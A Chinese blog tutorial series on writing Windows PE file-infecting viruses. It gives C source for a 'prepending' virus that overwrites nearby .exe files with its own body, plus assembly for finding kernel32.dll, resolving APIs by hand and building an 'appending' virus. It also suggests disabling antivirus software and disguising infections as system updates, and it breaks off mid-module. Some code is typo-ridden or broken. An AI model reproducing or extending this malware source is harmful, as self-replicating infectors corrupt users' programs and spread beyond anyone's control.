

# PE 病毒学习(一、二、三、四、五、六、七、八）

> 原文：[`www.pediy.com/kssd/pediy11/123287.html`](https://www.pediy.com/kssd/pediy11/123287.html)

欢迎来我的主页 http://blog.csdn.net/yangbostar/  
  
历史上，在 windows95 发布后，用高级语言编写的外壳病毒，经过简单地改造编译，就能从 DOS 平台迁移到 windows 平台上。  
  
并且在这当中很多“前置病毒”，仅仅需要重新编译。  
  
另外之所以用“前置病毒”作为第一分析样本，理由如下：  
  
1.它具有基本病毒功能模块，这些模块在文件型病毒中是通用的  
  
2.其框架结构，所需病毒技巧极少  
  
3.拓展方便，通过不断地加入新功能，循序渐进的学习各种病毒技巧  
  
4.加载新模块方便，适合测试其它病毒的某些功能模块  
  
  
文件型病毒至少有这四个模块：  
  
1.条件模块：判断触发条件和寻找符合条件的宿主文件  
  
2.破坏模块：  
  
3.感染模块：  
  
4.宿主程序引导模块：将病毒的控制权移交给所触发病毒文件的宿主程序  
  
样例：  
  
1.条件模块：  
  
   功能：搜索病毒文件所在目录中，规定数目的 exe 文件  
  
//打开符合条件的文件  
  
HANDLE OpenHostFile(const WIN32\_FIND\_DATA \*pHost,DWORD \*nCount)  
{  
 HANDLE hHost=CreateFile(pHost->cFileName,  
       GENERIC\_READ|GENERIC\_WRITE,  
       FILE\_SHARE\_READ|FILE\_SHARE\_WRITE,  
       0,  
       OPEN\_EXISTING,  
       NULL,  
       NULL);  
 if(hHost!=INVALID\_HANDLE\_VALUE)  
  (\*nCount)++;  
 return hHost;  
}  
  
//搜索函数  
DWORD FindHostFile(HANDLE \*szHostFileHandle,DWORD dwFindNumber)  
{  
 DWORD dwResult=0;  
 WIN32\_FIND\_DATA fd;  
 HANDLE hFirst=FindFirstFile(\_T("\*.exe"),&fd);  
 szHostFileHandle\[0\]=OpenHostFile(&fd,&dwResult);  
 while(dwResult<dwFindNumber)  
 {  
  DWORD dwTemp=dwResult;  
  if(FindNextFile(hFirst,&fd))  
  {  
   HANDLE hTemp=OpenHostFile(&fd,&dwResult);  
   if(INVALID\_HANDLE\_VALUE!=hTemp)  
    szHostFileHandle\[dwTemp\]=hTemp;  
  }  
  else  
   break;  
 }  
 return dwResult;  
}  
  
2.感染模块：  
  
   功能：将病毒文件注入宿主文件，将原宿主文件向后移动  
  
//定义病毒大小，使用全局变量是因为其它模块也要用到，53248 是代码在 VC2005  Debug 模式下的生成文件大小,但并非都是这样，请自行确定，如果大小错误，那么感染后的文件运行会出错。  
  
DWORD dwVirusSize=40960;  
//感染模块  
void Infect(HANDLE hHostFile,HANDLE hLocalFile)  
{  
  
 DWORD dwHostSize=GetFileSize(hHostFile,0);  
 DWORD dwReadSize=0;  
 DWORD dwWriteSize=0;  
  
 char \*pLocalTempBuf=(char\*)malloc(sizeof(char)\*dwVirusSize);  
 char \*pHostTempBuf=(char\*)malloc(sizeof(char)\*dwHostSize);  
 ReadFile(hLocalFile,pLocalTempBuf,dwVirusSize,&dwReadSize,NULL);  
 ReadFile(hHostFile,pHostTempBuf,dwHostSize,&dwReadSize,NULL);  
  
 SetFilePointer(hHostFile,0,0,FILE\_BEGIN);  
 WriteFile(hHostFile,pLocalTempBuf,dwVirusSize,&dwWriteSize,NULL);  
 WriteFile(hHostFile,pHostTempBuf,dwHostSize,&dwWriteSize,NULL);  
  
//清理工作  
 SetFilePointer(hLocalFile,0,0,FILE\_BEGIN);  
 free(pLocalTempBuf);  
 free(pHostTempBuf);  
}  
  
3.破坏模块：  
  
  功能：仅仅打印提示。  
VOID Destory()  
{  
 MessageBox(NULL,\_T("我保证什么都不做"),\_T("Test"),MB\_OK);  
}  
  
4.宿主程序引导模块  
  
   功能：创建临时文件，将所触发的病毒文件的宿主程序写入，然后启动  
  
VOID JumpLocalHostFile(HANDLE hLocalFile)  
{  
 DWORD nCount=0;  
 DWORD dwLocalFileSize=GetFileSize(hLocalFile,0);  
 if(dwLocalFileSize==dwVirusSize)  
  return ;  
 char \*pTemp=(char\*)malloc(sizeof(char)\*(dwLocalFileSize-dwVirusSize));  
 ReadFile(hLocalFile,pTemp,(dwLocalFileSize-dwVirusSize),&nCount,NULL);  
  
 TCHAR szLocalPath\[MAX\_PATH\];  
 TCHAR szTempPath\[MAX\_PATH\];  
 TCHAR szTempName\[50\];  
 GetModuleFileName(NULL,szLocalPath,sizeof(szLocalPath));  
 GetTempPath(MAX\_PATH,szTempPath);  
 GetFileTitle(szLocalPath,szTempName,50);  
 wcscat(szTempPath,szTempName);  
 HANDLE hJumpHost=CreateFile(szTempPath,GENERIC\_READ|GENERIC\_WRITE,FILE\_SHARE\_READ,0,CREATE\_NEW,NULL,NULL);  
 if(hJumpHost==INVALID\_HANDLE\_VALUE)  
  return ;  
 WriteFile(hJumpHost,pTemp,(dwLocalFileSize-dwVirusSize),&nCount,NULL);  
 free(pTemp);  
 CloseHandle(hJumpHost);  
  
 PROCESS\_INFORMATION information;   
 STARTUPINFO si = {sizeof(si)};  
  
 if(CreateProcess(szTempPath,NULL,  
      NULL,NULL,  
      FALSE,NORMAL\_PRIORITY\_CLASS,  
      NULL,NULL,  
      &si,&information))  
 {  
  WaitForSingleObject(information.hProcess,INFINITE);  
  DeleteFile(szTempPath);  
 }  
  
}  
  
5.程序入口  
  
#include "stdafx.h"  
#include <windows.h>  
#include <stdio.h>  
#include <stdlib.h>  
#include <Commdlg.h>  
int APIENTRY \_tWinMain(HINSTANCE hInstance,  
                     HINSTANCE hPrevInstance,  
                     LPTSTR    lpCmdLine,  
                     int       nCmdShow)  
{  
 TCHAR szLocalPath\[MAX\_PATH\];  
 GetModuleFileName(NULL,szLocalPath,sizeof(szLocalPath));  
 HANDLE hLocalFileHandle=CreateFile(szLocalPath,  
       GENERIC\_READ,  
       FILE\_SHARE\_READ,  
       0,  
       OPEN\_EXISTING,  
       NULL,  
       NULL);  
 HANDLE szHostHandle\[3\];  
 DWORD dwFoundFileNumber=FindHostFile(szHostHandle,3);  
 Destory();  
   
  
 for(DWORD i=0;i<dwFoundFileNumber;i++)  
 {  
  Infect(szHostHandle\[i\],hLocalFileHandle);  
  CloseHandle(szHostHandle\[i\]);  
 }  
  
 JumpLocalHostFile(hLocalFileHandle);  
 CloseHandle(hLocalFileHandle);  
 return 0;  
}  
  
后面几章，我们将逐渐优化这段代码，加入新功能，来学习病毒技巧，为将来的 PE 病毒打基础 

在上一章中的“前置病毒”中，由于它只是一个测试病毒，因此该病毒只是搜索病毒文件所在文件夹的 exe 文件。  
  
显然，为了让它具有更好传染性，能够历遍整个磁盘或某些重要文件夹的特性，是十分重要的。  
  
开始讨论历遍之前，先让我们来改进原来的代码  
  
首先在上一章的代码中，只要结尾是“.exe”的文件就被判断为"可执行程序"，这种方法在大多数情况下是正确的，但是如果程序经过压缩或加密后，该文件的 PE 结构会有改变，虽然它实际上让然能履行可执行程序的功能，但针对 PE 文件的操作可能出错。因此，确定.exe 后缀之后，做更加详细的文件类型检查很多时是必要的，参考代码如下：  
  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*/    
  
/\* 函数说明：判断文件是否是可执行文件  
  
/\* 参    数： hFile 文件句柄  
  
/\* 返 回 值：是可执行文件返回真，否则返回假   
  
BOOL IsExeFile(HANDLE hFile)  
{  
 IMAGE\_DOS\_HEADER dosHeader;  
 IMAGE\_NT\_HEADERS32 ntHeader;  
 DWORD nCount;  
  
 BOOL bResult=FALSE;  
 ReadFile(hFile, &dosHeader, sizeof(dosHeader),&nCount, NULL);  
  
//dos 头检查  
 if(nCount== sizeof(dosHeader))  
   if(dosHeader.e\_magic == IMAGE\_DOS\_SIGNATURE) // 是不是有效的 DOS 头？  
     if(SetFilePointer(hFile, dosHeader.e\_lfanew, NULL, FILE\_BEGIN) != -1)  
  
       {  
  
//NT 头检查  
  
         ReadFile(hFile, &ntHeader, sizeof(ntHeader), &nCount, NULL);  
         if(nCount == sizeof(ntHeader))  
            if(ntHeader.Signature == IMAGE\_NT\_SIGNATURE) // 是不是有效的 NT 头  
               if(ntHeader.FileHeader.Characteristics&IMAGE\_FILE\_EXECUTABLE\_IMAGE)//Characteristics 也可判断  
  
                                                                                                                                 //其他类型 PE 文件  
  
                   bResult=TRUE;  
  
       }  
  SetFilePointer(hFile, 0, NULL, FILE\_BEGIN)   
  
  return bResult;  
  
}  
  
 好嘞，终于进入正题，让我们谈谈历遍磁盘或目录的问题。  
  
 先说说好的病毒设计对历遍磁盘的设计要求：  
  
        1、避免对系统冲击过大：历遍磁盘对系统冲击相当大，并且有可能多个病毒同时开启，如果搜索时间较长，应该适当挂起程序，  
  
                                           将时间片还给系统  
  
        2、最好限制搜索文件数量和范围：不要试图感染本机所有文件，这样只能是病毒和系统一起完蛋；感染系统文件虽然十分有用，  
  
                                                       在有保护的情况下，非常容易被杀毒软件发现。  
  
        3、搜索速度要快：很多时候，不能单独开启新进程执行正常程序，因此正常程序不得不等待病毒程序完毕  
  
解决方方案：  
  
        方案一：如果能干掉杀毒软件的话，将关键目录目标文件和一般目录结合搜索，能取得不错效果  
  
        方案二：如果你为人低调的话，通过伪装或隐藏，比如模拟系统更新来注入到关键目录中  
  
        方案三：没有办法也是办法，搜索普通目录，比如迅雷、qq、一些网游也是不错的选择  
  
不管你选择哪种方法，这里给出一个文件树搜索参考代码：  
  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*/    
  
/\* 函数说明：历遍该路径下的可执行文件  
  
/\* 参    数：Top   文件路径   int nCount 搜索符合要求文件的最大数目  pFileHandle 将找到的符合要求文件句柄储存在这里  
  
/\* 返 回 值：找到符合要求文件的数目    
  
int SearchHostFile(TCHAR\* Top,int nCount,PHANDLE  szFileHandle)  
  
{  
  
  static  int  nResult=0;  
  
  WIN32\_FIND\_DATA fd;  
  HANDLE szFileHandle\[nResult\] = FindFirstFile(Top，&fd）;  
  if(szFileHandle\[nResult\]!=INVALID\_HANDLE\_VALUE)  
  
  {  
  
    if(fd.dwFileAttributes & FILE\_ATTRIBUTE\_DIRECTORY)  
       SearchHostFile(fd.cFileName,nCount,szFileHandle);  
  
    else  
  
       {  
  
          while(nResult<nCount)  
  
          {  
  
             if(IsExeFile(szFileHandle\[nResult\]))  
  
               nResult++;  
  
             FindNextFile(szFileHandle\[nResult\],&fd);  
  
             if(szFileHandle\[nResult\]==INVALID\_HANDLE\_VALUE)  
  
                break;  
  
             sleep(0);  
  
          }  
  
       }       
  
   }  
  
   return nResult;  
  
}  
  
以上纯属个人观点，由于本人能力有限，如有错误，请你指正，希望大家常来常往，互相交流  
  
  
  
本文来自 CSDN 博客，转载请标明出处：http://blog.csdn.net/yangbostar/archive/2010/09/19/5894360.aspx 

对 PE 文件结构的各个值定义和作用，这里不提了，网上资源很多，百度一下就好了。所以，本章只说一下，作为代码编写者对 PE 文件结构操作的方法和技巧。  
  
还是通过改进代码，来体会一下吧。  
  
  你应该记得前面的 BOOL IsPEFile(HANDLE hFIle) 这个函数吧，它的作用是判断文件是否为 PE 格式文件。它把文件句柄作为参数，虽然许多函数需要文件句柄这个参数，但是作为对 PE 文件结构操作的函数，这样做是不恰当的，因为如果这样做就要频繁的使用 SetFilePointer()、ReadFile()、WriteFile()。假若以文件指针作为参数，那么这一类关于 PE 结构文件操作的代码，将大大简化。  
  
举例：  
  
BOOL IsPEFile(LPVOID ImageBase)  
  
{  
  
  PIMAGE\_DOS\_HEADER pDosHeader=NULL;  
  
  PIMAGE\_NT\_HEADERS32 pNtHeaders=NULL;  
  
//指针安全检查  
  
  if(!ImageBase)  
  
    return FALSE;  
  
//dos 头检查  
  
  pDosHeader=(PIMAGE\_DOS\_HEADER)ImageBase;  
  
  if(pDosHeader->e\_magic!=IMAGE\_DOS\_SIGNATURE)  
  
    return FALSE;  
  
//NT 文件头检查  
  
  pNtHeaders=(PIMAGE\_NT\_HEADERS32)pDosHeader->e\_lfanew;  
  
  if(pNtHeaders->Signauture!=IMAGE\_NT\_SIGNATURE)  
  
    return FALSE;  
  
  return TRUE;  
  
}  
  
当然为了使文件以指针传入，需要将其映射到内存中，并且由于许多函数需要文件句柄，所以原来的 HANDLE OpenHostFile()需要改造。  
  
typedef struct PEFileInformation//用这个名字是因为将来还要添加其他成员  
  
{  
  
  HANDLE hFile;  
  
  HANLDE hMap;  
  
  LPVOID ImageBase;  
  
}INFORMATION\_PE\_FILE,\*PINFORMATION\_PE\_FILE;  
  
PINFORMATION\_PE\_FILE OpenHostFile(PINFORMATION\_PE\_FILE pFile,\\  
  
                                                              const WIN32\_FIND\_DATA \*pHost,\\  
  
                                                              DWORD \*nCount)  
{  
  pFile.hFile=CreateFile(pHost->cFileName,  
       GENERIC\_READ|GENERIC\_WRITE,  
       FILE\_SHARE\_READ|FILE\_SHARE\_WRITE,  
       0,  
       OPEN\_EXISTING,  
       NULL,  
       NULL);  
 if(pFile.hFile!=INVALID\_HANDLE\_VALUE)  
  
 {  
  
   pFile.hMap=CreateFileMapping(pFile.hFile,NULL,PAGE\_READONLY,0,0,NULL);  
  
   pFile.ImageBase=MapViewOfFile(pFile.hMap,FILE\_MAP\_WRITE |FILE\_MAP\_READ,\\  
  
                                                       0,0,0,0);  
   if(pFile.ImageBase!=NULL)  
  
     (\*nCount)++;  
  
   else  
  
     return NULL;  
  
 }  
  
else  
  
   return NULL;  
 return pFile;  
}  
  
OK,估计真正你已经了解 PE 文件结构操作的方法，即以 DOS 头为起点，逐步通过指针偏移，扫描 PE 结构，以下是一些获取常用 PE 结构参考代码  
  
//获取 NT 文件头  
  
PIMAGE\_NT\_HEADERS32 GetNtHeaders(LPVOID ImageBase)  
  
{  
  
  PIMAGE\_DOS\_HEADER pDosHeader=NULL;  
  
  PIMAGE\_NT\_HEADERS32 pNtHeaders=NULL;  
  
  if(!ImageBase)  
  
    return NULL;  
  
    
  
  pDosHeader=(PIMAGE\_DOS\_HEADER)ImageBase;  
  
  pNtHeaders=(PIMAGE\_NT\_HEADERS32)pDosHeader->e\_lfanew;  
  
  return  pNtHeaders;  
  
}  
  
//获取 PE 可选文件头  
  
PIMAGE\_OPTIONAL\_HEADER GetOptionalHeader(LPVOID ImageBase)  
  
{  
  
  PIMAGE\_NT\_HEADERS32 pNtHeaders=NULL;  
  
  pNtHeaders=GetNtHeaders(ImageBase);  
  
  if(!pNtHeader)  
  
     return NULL;  
  
  else  
  
     return &pNtHeaders->Header;  
  
}  
  
//获得区块表指针  
  
PIMAGE\_SECTION\_HEADER GetSectionHeader(LPVOID ImageBase)  
  
{  
  
  return (PIMAGE\_SECTION\_HEADER)(GetOptionalHeader(ImageBase)+sizeof(IMAGE\_OPTIONAL\_HEADER));  
  
}  
  
PE 结构上还要许多重要的位置，用的时候以上面的函数为基点，编写自己的函数吧  
  
  
本文来自 CSDN 博客，转载请标明出处：http://blog.csdn.net/yangbostar/archive/2010/10/06/5924323.aspx 

1.为何需要重定位？  
  
病毒的生存空间就是宿主程序，而因为宿主程序的不同。所以病毒每次插入到宿主程序中的位置也不同。那么病毒需要用到的变量的位置就无法确定。所以这就是病毒首先要重定位的原因。在我们编写程序的时候，所用到的变量的位置都是相对与程序某一个位置的偏移，正常的程序加载的地址是唯一的，所以它们不需要重定位。而病毒的加载是随机的所以就有了重定位的过程。虽然加载的位置不一定，但是变量到某一个位置的偏移却是固定的。所以重定位的基本原理就是找到这个特殊的位置。具体的方法有很多种。这里说几种常见的。  
  
前面介绍的“前置病毒”根本不需要重定位的，因为病毒写在病毒文件最前面，所以它的相对偏移和绝对偏移是相等的。  
  
然而，从本章开始，我们要为名为“追加病毒”的病毒，做技术积累。因为该病毒将病毒体追加到病毒文件尾，它的相对偏移和绝对偏移显然是不相等的。  
  
2.常见的重定位错误写法  
  
call Entry  
  
Entry:  
  
pop ebp  
  
sub ebp,offset Entry  
  
mov ImagePosition,ebp  
  
   其实这是一些关于计算机病毒教科书的故意错写的方法，，然而相当多的人不亲自动手实践，人云亦云，造成迄今为止大量的错误代码的出现，和病毒编写入门困难。  
  
3.重定位正确写法和变体  
  
start0:  
  
...  
  
start:  
  
call Entry  
  
...  
  
Entry:  
  
pop eax ;也可以用 MOV EXX，\[ESP\]代替 pop eax 取出栈顶的内容  
  
sub eax,5 ;减 5 是定位 start 的位置，如果定位 start0 的位置可写为 sub eax,offset start- offset start0  
  
  
  
本文来自 CSDN 博客，转载请标明出处：http://blog.csdn.net/yangbostar/archive/2010/10/07/5925648.aspx 

由于大部分的文件感染型病毒框架都不可以像“前置病毒”那样拥有自己的输入表，因此需要自行定位 API  
  
说一千道一万，想要定位 API，大方向是要定位 Kernel32.dll 的基地址。  
  
总结所以这些方法，可以分为是五个小方向，它们又产生很多变种。  
  
一、定位 kernel32.dll 基地址的方法  
  
(1)硬编码方式  
  
    由于 kernel32.dll 的基地址在相同版本 windows 下，基本上它的位置是固定的。这种方法在早期的 PE 病毒中很常见，现在已经很少使用了。  
  
(2)利用程序初始化时，首先寄存器或堆栈中保留的 kernel32.dll 内存模块中的某个地址，之后无论哪种变体，都是以这个 kernel 内的地址向前搜索，找到 kernel.dll 的基地址。  
  
以下地方就存储着这些地址：    
  
                                     ①寄存器 EDI  
  
                                     ②刚刚初始化的堆栈：\[esp\]、\[esp+4H\]、\[esp+10H\]  
  
以\[esp+10h\]为例，我们看一下参考代码(另外注释里有一些常见错误代码的写法):  
  
Start:    
  
  mov edx,\[esp+10h\]  
SearchDosHeader:  
  dec  edx  
  xor  dx,dx                       ;加速搜索，因为 DLL 以 1M 长度对齐，所以这里以 64K 字节为跨度来加速搜索  
  cmp word ptr\[edx\],'ZM'  ;不要自作聪明写成'MZ',那是以字节逐个读取的结果  
  
                                        ;，这里是以双字节读取的，'Z'在高位，'M'在低位,因此写为'ZM'  
  jnz SearchDosHeader  
  
IsNTHeaders:  
  mov eax,\[edx+3ch\]        ;这里也不要写为\[edx+IMAGE\_NT\_HEADERS32.Signatrue\],这样不会得到想要的结果  
  cmp word ptr \[eax+edx\],'EP' ;和'ZM'是一个道理  
  jnz  SearchDosHeader  
  
  mov KernelImageBase,edx  ；KernelImageBase 是自定义局部变量，可以放在堆栈里  
  
  ret  
end Start  
  
(3)遍历 seh 异常链，然后获得 EXCEPTION\_REGISTRATION 结构 prev 为-1 的异常处理过程地址，这个异常处理过程地址是位于 kernel32.dll 中，通过它向前搜索得到 kernel32.dll 的基地址。  
  
以下是参考代码：  
  
Start:  
  
assume fs:nothing     ;Masm 默认是不使用 fs 寄存器的，写上这句话才能使用  
  mov edx,\[fs:0\]         ;获得 EXCEPTION\_REGISTRATION 结构地址  
Next:  
  inc   dword ptr \[edx\];将 prev 成员 + 1,判断是否为零，然后恢复  
  jz     Kml  
  dec  dword ptr \[edx\]  
  mov edx,\[edx\]  
  jmp  Next  
  
Kml:  
  dec  dword ptr \[edx\];恢复 -1  
  mov edx,\[edx+4\]  
  
SearchDosHeader:  
  dec  edx  
  xor  dx,dx  
  cmp word ptr\[edx\],'ZM'  
  jnz SearchDosHeader  
  
IsNTHeaders:  
  mov eax,\[edx+3ch\]  
  cmp word ptr \[eax+edx\],'EP'  
  jnz SearchDosHeader  
  
  mov KernelImageBase,edx  
  
  ret  
  
end Start  
  
(4)通过 TEB 获得 PEB 结构地址，然后再获得 PEB\_LDR\_DATA 结构地址，然后遍历模块列表，查找 kernel32.dll 模块的基地址。  
  
Start:  
  
assume fs:nothing  
  
  mov edx, \[fs:30h\]    ;Get Peb  
  mov edx, \[edx+0ch\] ;Get \_PEB\_LDR\_DATA  
  
  mov edx, \[edx+1ch\] ;Get InInitializationOrderModuleList.Flink, 此时 eax 指向的是 ntdll 模块的  
                                ;InInitializationOrderModuleList 线性地址。所以我们获得它的下一个则是 kernel32.dll  
  mov edx, \[edx\]  
  mov edx, \[edx+8\]    ; 8 = sizeof.LIST\_ENTRY  
  
  mov KernelImageBase,edx  
  
  ret   
  
end Start  
  
(5)一个正常的程序的输入表都会加载 Kernel32.dll，所以通过搜索宿主本身的输入表，再找到 Kernel32.dll，然后搜索它基地址。但是这个方法缺点首先是代码长度比较长，并且病毒首次编译后，其本身输入表不加载 Kernel32.dll，需要手工抽取代码，然后绑定到宿主程序上，这样病毒才算真正完成。  
  
步骤：  
  
1.找到本程序的 PE 头文件，方法有三种：①利用默认文件内存加载点 400000h  
  
                                                       ②利用进程初始化堆栈的\[esp+34h\]保存的程序入口点，向前找到问 PE 文件头  
  
                                                       ③重定位当前点，向前搜索  
  
2.再找到输入表、进而找到 Kernel32.dll，代码就不写了，一点也不难  
  
3.手工绑定，具体步骤请参考《Windows 应用程序捆绑核心编程》(张正秋著)第一版的第十一章。  
  
**二、通过自己实现的 GetProcAddress 定位 API**  
  
   在 Kernel32.dll 中有 GetProcAddress 这个函数，它可以通过函数名定位函数入口地址。可是由于不知道 GetProcAddress 的地址，只好由我们自己实现，以下代码可供参考，如果对 PE 结构了解十分清楚，那么代码是很容易读懂的。  
  
   
  
My\_Get\_API\_Address proc Base:dword,sFunctionName:dword  
LOCAL NumberOfName:dword  
LOCAL AddressOfFunctions:dword  
LOCAL AddressOfNames:dword  
LOCAL AddressOfOrdinarls:dword  
;定位输出表  
  mov ebx,Base  
  mov eax,\[ebx+3ch\]  
  mov eax,\[ebx+eax+78h\]  
  add eax,ebx  
;取出输出表中一些有用的值     
  mov  ebx,\[eax+18h\]  
  mov  NumberOfName,ebx  
  mov  ebx,\[eax+1ch\]  
  add  ebx,Base  
  mov  AddressOfFunctions,ebx  
  mov  ebx,\[eax+20h\]  
  add  ebx,Base  
  mov  AddressOfNames,ebx  
  mov  ebx,\[eax+24h\]  
  add  ebx,Base  
  mov  AddressOfOrdinarls,ebx  
;根据函数名找出函数 ID  
  xor eax,eax  
  mov edi,AddressOfNames  
  mov ecx,NumberOfName  
    
  LoopNumberOfName:  
        mov esi,sFunctionName  
        push eax  
        mov ebx,\[edi\]  
        add ebx,Base  
        Match\_API:  
         mov al,byte ptr\[ebx\]  
         cmp al,\[esi\]  
         jnz Not\_Match  
         or al,0h  
         jz GetKernel\_API\_Index\_Found  
         inc ebx  
         inc esi  
         jmp Match\_API  
        Not\_Match:  
        pop eax  
        inc eax  
        add edi,4h  
  loop LoopNumberOfName  
GetKernel\_API\_Index\_Found:  
  pop eax    
;用函数 ID 找出函数入口地址    
Get\_API\_Address:    
  mov ebx,AddressOfOrdinarls  
  movzx eax,word ptr\[ebx+eax\*2\]  
  imul eax,4h  
  add  eax,AddressOfFunctions  
  mov  eax,\[eax\]  
  add  eax,Base  
  ret  
My\_Get\_API\_Address endp  
  
  
OK，既然已经有了自己编写的 GetProcAddress，那么我们就可以通过它定位 Kernel32.DLL 里的正牌 GetProcAddress 和 LoadLibraryA。  
  
不过小陈告诉另一个方法，GetProcAddress 和 LoadLibraryA 都可以不必定位，其中 GetProcAddress 可以使用自己编写了，自然可以不必定位。至于 LoadLibrary 返回的动态链接库 DLL 模块句柄，实际上就是动态链接库的基地址，虽然由于我们现在只有 Kernel32.dll 的基地址，如果想定位其他动态链接库，只有搜索宿主文件是否加载了相应的动态链接库，如果没有，也可修改它的 PE 文件头，让它在启动时加载该动态链接库，然后仿照搜索 Kernel32.dll 类似的方法，确定其入口地址，即模块句柄。  
  
终于完成这章了，好幸福！关于动态重定位 API 方法肯定不止这些方法，比如“三、通过 API 的名称来定位 API 的地址”这个标题下应该不止一种方法，学海无涯啊。再次欢迎有好方法的高手，不吝赐教，帮助我不断更新这篇文章。  
  
  
这里感谢 pencil 和小陈，pencil 提醒了我应该仿写 GetProcAddress，小陈告诉了我，替代 LoadLibraryA 的实现方法。  
  
  
本文来自 CSDN 博客，转载请标明出处：http://blog.csdn.net/yangbostar/archive/2010/10/08/5928365.aspx 

OK，兑现我的承诺，从本章开始讲述“追加病毒”的编写方法。我们将实现一个只弹出对话框的良性病毒，但是考虑到这个代码可能造成的危害，我会在感染模块中写入一个小 Bug。不过，对于大家的学习是毫无影响的。  
  
  回到正题，先介绍一下“追加病毒”，在 DOS 时代中，这种病毒相当常见。由于.com 文件的入口点是固定的，而且我们知道 DOS 平台程序可以随意使用中断，因此追加病毒只要将病毒代码追加到宿主文件尾，然后修改入口点代码成“jmp \[病毒入口点\]”，病毒执行完成后，再 jmp 到宿主程序。  
  
  到了 win32 平台下，这种方法是不行滴。首先由于 win32 下，应用程序不能使用中断，取而代之的是 API，但是常用宿主文件的 PE 文件格式只会为宿主文件本身配置 API，病毒代码是不能直接得到的。其次将病毒代码追加到文件尾，如果不修改宿主文件的 PE 头，病毒可能不被加载到内存中。还有 DOS 追加病毒就存在的数据重定位问题，那么看看下面我们如何解决这些问题呢？  
  
一.先看一下主模块 Main.asm  
  
.386  
.model flat, stdcall  
option casemap:none  
include windows.inc ;虽然不会调用这里的函数，但是其中的常量还是用的，比如 INVILID  
include My\_Marco.asm ;自定义的一些宏,里边内容用的时候我再说  
  
  
.code  
Start:  
  main proc  
;主模块分成五个子模块  
  Include Data\_and\_Locate.asm   
   Include ReLocate\_API.asm  
   Include Infect.asm  
   Include Destory.asm  
   Include Cleanup\_and\_jmp.asm  
  ret  
main endp  
include My\_Function.asm;这个里边放着一些调用函数，比如是上一篇中的 My\_Get\_API\_Address   
VirusSize=$-Start ;病毒长度  
  
  
end Start  
  
    
  
二.局部变量和只读数据以及只读数据重定位模块 Data\_and\_Locate.asm  
  
;首先声明 main proc 的局部变量  
  
LOCAL Kernel32Base:dword  
LOCAL Kernel32NumberOfName:dword  
LOCAL Kernel32AddressOfFunctions:dword  
LOCAL Kernel32AddressOfNames:dword  
LOCAL Kernel32AddressOfOrdinarls:dword  
LOCAL DataBase:dword  
LOCAL HostFileSize:dword   
  
LOCAL hKernel32DLL:HANDLE  
LOCAL hUser32DLL:HANDLE  
LOCAL hFindFirstFile:HANDLE  
  
LOCAL szLocalFilePath\[MAX\_PATH\]:byte  
  
LOCAL stHostFile:PE\_FileInformation  
LOCAL stLocalFile:PE\_FileInformation  
  
LOCAL aLoadLibraryA:dword  
LOCAL aGetProcAddress:dword  
LOCAL aCreateFileA:dword  
LOCAL aCreateFileMappingA:dword  
LOCAL aMapViewOfFile:dword  
LOCAL aFindFirstFileA:dword  
LOCAL aFindNextFileA:dword  
LOCAL aGetModuleFileNameA:dword  
LOCAL aGetFileSize:dword  
LOCAL aUnmapViewOfFile:dword  
LOCAL aCloseHandle:dword  
LOCAL aMessageBoxA:dword  
  
LOCAL Temp:dword  
LOCAL fd:WIN32\_FIND\_DATA  
LOCAL NewSectionTable:dword  
LOCAL Virus\_OEP\_File:dword  
LOCAL Virus\_OEP\_Map:dword  
  
  
  
;重定位数据，使得数据内嵌在代码节中,同时定位标记“Data：”的地址  
call Relocation      
Data:  
  
     sLoadLibraryA =$-Data ;该只读数据与 Data 的偏移  
      byte  'LoadLibraryA',0 ;数据内容，可以看出这是一个 C 风格的字符串  
        
    sGetProcAddress  =$-Data  
       byte   'GetProcAddress',0  
       
     sKernel32DLL  =$-Data  
       byte  'Kernel32.dll',0  
         
     sUser32DLL    =$-Data  
       byte  'User32.dll',0  
       
     sCreateFileA  =$-Data  
       byte  'CreateFileA',0  
       
     sCreateFileMappingA=$-Data  
        byte  'CreateFileMappingA',0  
       
     sMapViewOfFile  =$-Data  
       byte  'MapViewOfFile',0  
       
     sFindFirstFileA  =$-Data  
       byte  'FindFirstFileA',0  
         
     sFindFirstFileA\_Param=$-Data  
        byte  '\*.exe',0  
       
     sFindNextFileA  =$-Data  
       byte  'FindNextFileA',0  
         
     sGetModuleFileNameA=$-Data  
       byte  'GetModuleFileNameA',0  
       
     sUnmapViewOfFile  =$-Data  
       byte  'UnmapViewOfFile',0  
         
     sGetFileSize  =$-Data  
        byte  'GetFileSize',0  
         
     sCloseHandle  =$-Data  
        byte  'CloseHandle',0  
         
     sCaption    =$-Data  
       byte  'The virus for testing',0  
       
     sContext    =$-Data  
       byte   'This is a additional virus',0  
       
     sMessageBoxA  =$-Data  
        byte  'MessageBoxA',0  
       
     sNewSectionName  =$-Data  
       byte  '.Virus',0,0    
       
     aOEP\_HostFile  =$-Data  
        dword  0h                
    
Relocation:  
  pop DataBase ;不但 pop 的值恰好是 Data：的地址，call 又巧妙地跳过数据块  
  
  
三.API 重定位模块 ReLocate\_API.asm  
  
;取得 Kernel32.dll 的基址  
  assume fs:nothing  
  mov eax, \[fs:30h\]   
  mov eax, \[eax+0ch\]  
  mov eax, \[eax+1ch\]  
  mov eax, \[eax\]  
  mov eax, \[eax+8h\]  
  mov  Kernel32Base,eax  
  
;利用 LoadLibrary 和 GetProcAddress 取得所需函数的地址   
;这里使用了 My\_Marco.asm 的宏  
;PushData macro Base,OffsetAddress  
;  mov eax,Base  
;  add eax,OffsetAddress  
;  push eax  
;ENDM  
  
  PushData DataBase,sLoadLibraryA  
  push Kernel32Base    
  call My\_Get\_API\_Address  
  mov  aLoadLibraryA,eax ;得到函数 LoadLibraryA 的地址  
  
  PushData DataBase,sGetProcAddress  
  push Kernel32Base    
  call My\_Get\_API\_Address  
  mov  aGetProcAddress,eax ;得到函数 GetProcAddress 的地址  
   
;利用 LoadLibrary 和 GetProcAddress 取得所需函数的地址  
  
;这里使用了 My\_Marco.asm 的宏  
  
;Using\_API\_LoadLibraryA macro Value,Base,OffsetAddress  
;  PushData Base,OffsetAddress  
;  call aLoadLibraryA  
;  mov Value,eax  
;ENDM  
  
